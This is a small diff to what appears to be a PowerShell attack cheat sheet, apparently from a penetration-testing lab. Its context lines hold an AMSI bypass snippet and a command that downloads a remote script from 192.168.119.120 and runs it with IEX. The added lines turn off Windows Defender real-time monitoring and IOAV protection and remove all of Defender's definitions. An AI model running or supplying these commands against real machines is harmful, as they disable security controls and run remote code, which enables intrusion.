@@ -5,3 +5,9 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 
 (new-object system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | IEX
+
+
+Get-MPPreference
+Set-MPPreference -DisableRealTimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
